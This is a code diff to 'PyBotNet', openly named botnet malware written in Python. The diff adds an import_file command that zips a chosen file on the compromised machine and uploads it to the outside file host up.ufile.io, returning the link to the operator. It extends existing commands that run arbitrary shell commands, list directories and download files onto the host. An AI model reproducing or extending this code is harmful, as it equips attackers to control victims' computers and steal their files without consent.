@@ -1,10 +1,11 @@
 '''Defult PyBotNet scripts'''
 import re
+import os
 
 from logging import exception
 from time import sleep
 from subprocess import check_output
-from os import listdir, getcwd
+
 from uuid import getnode as get_system_mac_addres
 from requests import get
 
@@ -19,13 +20,15 @@ scripts_name = {
     "get_info": "get_info",
     "cmd": "cmd <command>",
     "ls": "ls <route>",
-    "export_file": "export_file <download link>"
+    "export_file": "export_file <download link>",
+    "import_file": "import_file <file route>"
 }
 
 # "import_file": "import_file <route>"
 
 
 def split_command(command: str) -> list:
+    '''split string by space'''
     return command.split(' ')
 
 
@@ -65,6 +68,8 @@ def execute_scripts(command: str, pybotnet_up_time, is_shell: bool, logger):
                 return execute_ls(command, logger)
             elif command_name == 'export_file':
                 return execute_download_manager(command, logger)
+            elif command_name == 'import_file':
+                return execute_upload_manager(command, logger)
 
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
@@ -156,7 +161,7 @@ def execute_ls(command, logger) -> str:
 
 def ls(route: str) -> str:
     try:
-        return listdir(route)
+        return os.listdir(route)
 
     except FileNotFoundError as error:
         return f'ls {error}'
@@ -178,7 +183,7 @@ def execute_download_manager(command: str, logger):
 
         res = download_manager(down_link, file_name)
         if res:
-            return f'file download and save; \n\nfrom:\n{down_link} \n\nfile name:\n{file_name} \n\n route:\n{getcwd()}'
+            return f'file download and save; \n\nfrom:\n{down_link} \n\nfile name:\n{file_name} \n\n route:\n{os.getcwd()}'
         return f'download False {down_link}'
 
     except IndexError as error:
@@ -203,3 +208,36 @@ def download_manager(down_link: str, file_name: str) -> bool:
 
     except:
         return False
+
+
+def execute_upload_manager(command: str, logger):
+    '''execute import_file <file route>'''
+    command = split_command(command)
+
+    try:
+        route = command[1]
+        return upload_manager(route, logger)[1]
+    except Exception as error:
+        logger.error(f'execute_upload_manager: {error}')
+        return 'bad format'
+
+
+def upload_manager(file_route: str, logger):
+    '''zip file and upload to up.ufile.io and return link,..'''
+    is_true, zip_file_name = util.make_zip_file(file_route, logger)
+
+    if is_true:
+        try:
+            with open(zip_file_name, 'rb') as file:
+                binary_file = file.read()
+                is_true, download_data = util.upload_server_1(
+                    binary_file, zip_file_name, logger)
+                os.remove(zip_file_name)
+                if is_true:
+                    return True, download_data
+                return False, 'Upload Failed'
+
+        except Exception as error:
+            logger.error(f'upload_manager: {error}')
+            return False, 'Upload Failed'
+    return False, 'file not found'
